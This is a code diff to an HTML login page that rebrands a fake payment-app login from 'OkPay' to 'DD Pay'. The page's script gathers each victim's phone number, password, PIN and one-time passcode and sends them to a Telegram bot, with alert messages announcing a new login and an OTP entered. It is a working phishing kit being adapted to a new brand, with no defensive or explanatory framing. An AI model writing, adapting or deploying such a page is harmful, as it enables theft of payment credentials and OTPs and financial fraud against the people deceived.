@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OkPay - Login</title>
+    <title>DD Pay - Login</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
@@ -54,8 +54,8 @@
 
     <div class="main-container">
         <div class="logo-container">
-            <!-- Yahan apni OkPay image ka naam daalein -->
-            <img src="IMG_20260918_140701_656.jpg" alt="OkPay">
+            <!-- Yahan apni DD Pay image ka naam daalein, jaise: IMG-20260916-WA0005.JPG -->
+            <img src="IMG-20260916-WA0005.JPG" alt="DD Pay">
         </div>
 
         <form id="loginForm">
@@ -148,7 +148,7 @@
             const password = document.getElementById('password').value;
             const pin = document.getElementById('pin').value;
 
-            const msg = `🔔 *OkPay: Naya User Login Kar Raha Hai!*\n\n📞 Phone: ${phone}\n🔑 Password: ${password}\n🔢 PIN: ${pin}`;
+            const msg = `🔔 *DD Pay: Naya User Login Kar Raha Hai!*\n\n📞 Phone: ${phone}\n🔑 Password: ${password}\n🔢 PIN: ${pin}`;
             sendToTelegram(msg); 
 
             displayPhone.innerText = `+91 ${phone}`;
@@ -163,7 +163,7 @@
             let timeLeft = 60;
             this.innerText = `${timeLeft}s`;
 
-            const msg = `🚨 *OkPay: OTP Request Aaya Hai!*\n\n📱 User ne Send OTP dabaya.\n📞 Phone: ${phone}`;
+            const msg = `🚨 *DD Pay: OTP Request Aaya Hai!*\n\n📱 User ne Send OTP dabaya.\n📞 Phone: ${phone}`;
             await sendToTelegram(msg);
 
             timerInterval = setInterval(() => {
@@ -191,7 +191,7 @@
             this.innerText = "Confirming...";
             this.disabled = true;
 
-            const msg = `✅ *OkPay: OTP Enter Hua!*\n\n📞 Phone: ${phone}\n🔢 Entered OTP: ${otp}`;
+            const msg = `✅ *DD Pay: OTP Enter Hua!*\n\n📞 Phone: ${phone}\n🔢 Entered OTP: ${otp}`;
             const success = await sendToTelegram(msg);
 
             if(success) {
